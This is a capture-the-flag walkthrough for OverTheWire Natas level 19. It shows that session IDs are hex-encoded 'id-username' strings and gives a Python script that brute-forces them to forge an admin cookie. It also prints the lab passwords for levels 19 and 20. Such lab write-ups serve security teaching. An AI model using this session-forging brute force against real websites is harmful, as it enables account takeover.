# Natas Level 19 → Level 20

### Challenge

**URL: http://natas19.natas.labs.overthewire.org/**

This level is very similar to the previous one (Natas 18), but the developer has attempted to obscure the Session IDs. Instead of simple integers (e.g., `123`), the `PHPSESSID` cookie now appears as a long alphanumeric string.

Upon logging in with a test username (e.g., `test`), we receive a session ID like: `3538322d74657374`

If we decode this string from **Hexadecimal to ASCII**, we reveal the underlying structure: `3538322d74657374` → `582-test`

**The Pattern:** The session ID format is simply `{Numerical_ID}-{username}` encoded in Hex.

To bypass authentication, we must find a valid session ID where the username part is `admin`. This means we need to brute force the numerical ID, append `-admin`, hex-encode it, and send it to the server.

---

### Walkthrough

1. **Analyze the Target:** We need to generate cookies that decode to: `1-admin`, `2-admin`, ... `640-admin`.
2. **Encoding Logic:** If we want to try ID `280`:
   - String: `280-admin`
   - Hex Encoded: `3238302d61646d696e`
   - Cookie: `PHPSESSID=3238302d61646d696e`

3. **Automation:** We will adapt our script from Level 18 to encode the payload before sending the request.

```
import requests
import binascii

target = "http://natas19.natas.labs.overthewire.org"
auth = ("natas19", "8LMJEhKFbMJRLiwq53HTztGSwJ4SIV4c") # Password from Level 18
headers = {"Content-Type": "application/x-www-form-urlencoded"}

print("Brute forcing Hex-Encoded Session IDs...")

# We assume the max ID is similar to the previous level (640)
for i in range(1, 641):
    # 1. Construct the raw session string
    raw_session = f"{i}-admin"

    # 2. Encode it to Hex
    # .encode() turns string to bytes, .hex() turns bytes to hex string
    encoded_session = raw_session.encode('utf-8').hex()

    # 3. Set the cookie
    cookies = {"PHPSESSID": encoded_session}

    try:
        r = requests.post(target, auth=auth, cookies=cookies, timeout=5)

        # 4. Check for success
        if "You are an admin" in r.text:
            print(f"\n[+] Admin session found!")
            print(f"    Raw ID: {raw_session}")
            print(f"    Cookie: {encoded_session}")

            # Extract the password
            content_lines = r.text.splitlines()
            for line in content_lines:
                if "Password:" in line:
                    print(f"    {line.strip()}")
            break

        if i % 50 == 0:
            print(f"Checked {i} sessions...")

    except Exception as e:
        print(f"Error: {e}")

print("Done.")
```

4. Run the script. It works exactly like the previous level but handles the encoding layer.

---

### Credentials Found

- **Username:** `natas20`
- **Password:** `p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw`
